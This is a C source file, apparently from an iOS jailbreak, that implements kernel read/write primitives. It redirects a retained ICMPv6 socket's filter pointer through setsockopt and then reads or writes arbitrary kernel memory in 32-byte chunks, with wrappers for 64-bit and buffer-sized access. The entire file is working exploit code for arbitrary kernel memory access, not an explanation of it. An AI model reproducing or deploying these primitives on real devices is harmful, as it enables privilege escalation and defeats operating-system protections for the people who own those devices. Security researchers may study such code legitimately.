#include "krw.h"

#include <errno.h>
#include <netinet/icmp6.h>
#include <netinet/in.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include <libjailbreak/primitives.h>
#include <libjailbreak/util.h>

static bool set_target_kaddr(uint64_t where) {
    if (where <= 0xfffff00000000000){
        LOG_ERR("set_target_kaddr: invalid kaddr %#llx", where);
        walk_backtrace(^bool(int frame_index, unw_word_t pc, unw_word_t offset, const char *symbol_name) {
            if (symbol_name) {
                LOG_ERR("  [%d] 0x%llx %s + 0x%llx", frame_index, (unsigned long long)pc, symbol_name, (unsigned long long)offset);
            } else {
                LOG_ERR("  [%d] 0x%llx (no symbol info)", frame_index, (unsigned long long)pc);
            }
            return true;
        });
        return false;
    }
    memset(g_ctx.control_data, 0, sizeof(g_ctx.control_data));
    // set the address we want to read from
    memcpy(g_ctx.control_data, &where, sizeof(where));

    // socket_t sock, int level, int optname, const void *optval, int optlen
    // we're writting rw_sockets icmp6filt ptr
    int res = setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.control_data, sizeof(g_ctx.control_data));
    if (res != 0) {
        LOG_ERR("set_target_kaddr: setsockopt: %s (%d)", strerror(errno), errno);
        return false;
    }
    return true;
}

bool park_krw_socket(void) {
    // The exploit deliberately retains the socket/PCB. Keep its redirected
    // ICMPv6 filter pointed at a 32-byte range in that retained PCB, never at
    // a short-lived IOSurface object after an operation returns.
    if (g_ctx.control_socket < 0 || g_ctx.rw_socket_pcb <= 0xfffff00000000000)
        return false;
    return set_target_kaddr(g_ctx.rw_socket_pcb +
                            g_ctx.offsets.inpcb_icmp6filt + 8);
}

static bool krw_address_ok(uint64_t where) {
    return where > 0xfffff00000000000 &&
           (where & PAGE_MASK) <= PAGE_SIZE - EARLY_KRW_LENGTH;
}

bool krw_read_32_bytes(uint64_t where, uint8_t out[32]) {
    if (!out || !krw_address_ok(where)) return false;
    bool ok = false;
    if (set_target_kaddr(where)) {
        socklen_t length = EARLY_KRW_LENGTH;
        ok = getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
                        out, &length) == 0 && length == EARLY_KRW_LENGTH;
    }
    if (!park_krw_socket()) {
        LOG_ERR("kernel read could not park redirected socket; reboot device before retrying");
        return false;
    }
    return ok;
}

bool krw_write_32_bytes(uint64_t where, const uint8_t input[32]) {
    if (!input || !krw_address_ok(where)) return false;
    bool ok = false;
    if (set_target_kaddr(where)) {
        ok = setsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
                        input, EARLY_KRW_LENGTH) == 0;
    }
    if (!park_krw_socket()) {
        LOG_ERR("kernel write could not park redirected socket; reboot device before retrying");
        return false;
    }
    return ok;
}

void early_kreadbuf(uint64_t where, void *readBuf, size_t size)
{
    //printf("kreadbuf %#llx %p %#lx\n", where, readBuf, size); fflush(stdout); usleep(10000);
    
    if (size > EARLY_KRW_LENGTH) {
        LOG_ERR("error: (size > EARLY_KRW_LENGTH)\n");
        return;
    }
    
    uint64_t real_end = where + EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (EARLY_KRW_LENGTH - size);
    }
    
    //printf("offset %#llx\n", offset); fflush(stdout); usleep(10000);

    if (!set_target_kaddr(where - offset)) {
        LOG_ERR("early_kreadbuf: failed to set target kaddr\n");
        return;
    }
    uint8_t tmpBuf[EARLY_KRW_LENGTH];
    
    socklen_t read_data_length = EARLY_KRW_LENGTH;
    int res = getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, &read_data_length);
    if (res != 0) {
        LOG_ERR("getsockopt failed!!!\n");
        return;
    }
    
    memcpy(readBuf, &tmpBuf[offset], size);
}

uint64_t early_kread64(uint64_t where)
{
    uint64_t value = 0;
    early_kreadbuf(where, &value, sizeof(value));
    return value;
}

void early_kwritebuf(uint64_t where, void *writeBuf, size_t size)
{
    if (size > EARLY_KRW_LENGTH) {
        LOG_ERR("error: (size > EARLY_KRW_LENGTH)\n");
        return;
    }
    
    uint64_t real_end = where + EARLY_KRW_LENGTH - 1;
    
    int64_t offset = 0;
    if ((where & ~PAGE_MASK) != (real_end & ~PAGE_MASK)) {
        // if we would cross a page boundary without the user wanting it, we need to align the read to the end of the buffer
        // this prevents errors / panics when the next page isn't mapped
        offset = (EARLY_KRW_LENGTH - size);
    }
    uint8_t tmpBuf[EARLY_KRW_LENGTH];
    early_kreadbuf(where - offset, tmpBuf, EARLY_KRW_LENGTH);
    memcpy(&tmpBuf[offset], writeBuf, size);

    if (!set_target_kaddr(where - offset)) {
        LOG_ERR("early_kwritebuf: failed to set target kaddr\n");
        return;
    }
    int res = setsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, tmpBuf, EARLY_KRW_LENGTH);
    if (res != 0) {
        LOG_ERR("setsockopt failed!!!\n");
        return;
    }
}

void early_kwrite64(uint64_t where, uint64_t what)
{
    early_kwritebuf(where, &what, sizeof(what));
}

int clearsword_kreadbuf(uint64_t kaddr, void* output, size_t size)
{
    uint8_t *output8 = (uint8_t *)output;
    size_t bytes_read = 0;

    while (bytes_read < size) {
        size_t chunk = (size - bytes_read < EARLY_KRW_LENGTH) ? (size - bytes_read) : EARLY_KRW_LENGTH;
        early_kreadbuf(kaddr + bytes_read, &output8[bytes_read], chunk);
        bytes_read += chunk;
    }
    return 0;
}

int clearsword_kwritebuf(uint64_t kaddr, const void* input, size_t size)
{
    uint8_t *input8 = (uint8_t *)input;
    size_t bytes_written = 0;

    while (bytes_written < size) {
        size_t chunk = (size - bytes_written < EARLY_KRW_LENGTH) ? (size - bytes_written) : EARLY_KRW_LENGTH;
        early_kwritebuf(kaddr + bytes_written, &input8[bytes_written], chunk);
        bytes_written += chunk;
    }
    return 0;
}
